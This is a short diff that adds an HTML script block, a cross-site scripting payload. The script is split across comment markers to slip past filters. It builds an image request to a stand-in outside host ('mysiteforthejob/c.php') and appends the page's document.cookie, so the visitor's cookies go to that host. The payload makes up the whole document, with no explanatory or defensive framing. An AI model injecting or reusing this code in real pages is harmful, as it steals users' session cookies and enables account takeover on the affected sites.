@@ -1,0 +1,7 @@
+<script>/*
+*/var i=new Image();/*
+*/i.src=“http://my” +/*
+*/“siteforthejob/” +/*
+*/“c.php?cookie=” +/*
+*/document.cookie;/*
+*/</script>
